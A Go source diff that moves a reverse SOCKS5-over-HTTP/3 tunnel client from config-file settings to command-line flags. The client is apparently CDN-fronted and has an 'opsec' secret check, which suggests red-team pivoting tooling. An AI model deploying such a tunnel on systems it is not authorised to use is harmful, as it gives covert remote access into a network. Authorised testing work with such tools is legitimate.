@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -18,6 +19,17 @@ type Conf_result struct {
 	Host_name   string
 }
 
+type toFlags []string
+
+func (f *toFlags) String() string {
+	return ""
+}
+
+func (f *toFlags) Set(value string) error {
+	*f = append(*f, value)
+	return nil
+}
+
 func main() {
 	jsonFile, err := os.Open("config.json")
 	if err != nil {
@@ -30,16 +42,13 @@ func main() {
 	var result Conf_result
 	json.Unmarshal([]byte(byteValue), &result)
 
-	fmt.Println(result)
 	secret := result.Secret
 
-	cdn_ip_port := result.Cdn_ip_port
+	name_defalt := "test123"
+	name := flag.String("name", name_defalt, "client name")
 
-	sni_name := result.Sni_name
-	fmt.Println(sni_name)
-
-	host_name := result.Host_name
-	fmt.Println(host_name)
+	server_port := result.Cdn_ip_port
+	server := flag.String("server", server_port, "server addr")
 
 	//Use a secret to enhence opsec
 	if secret != "C{ZM2<%4H!)$kQ8cuaV?" {
@@ -59,10 +68,10 @@ func main() {
 	var fromaddr []string
 	fromaddr = append(fromaddr, ":8080")
 
-	var toaddr []string
-	toaddr = append(toaddr, "")
+	var toaddr toFlags
+	flag.Var(&toaddr, "toaddr", "to addr")
 	config := proxy.DefaultConfig()
-	_, err = proxy.NewClient(config, "rhttp3", cdn_ip_port, "test", "REVERSE_SOCKS5", proxyprotostr, fromaddr, toaddr)
+	_, err = proxy.NewClient(config, "rhttp3", *server, *name, "REVERSE_SOCKS5", proxyprotostr, fromaddr, toaddr)
 	if err != nil {
 		fmt.Println("err")
 	}
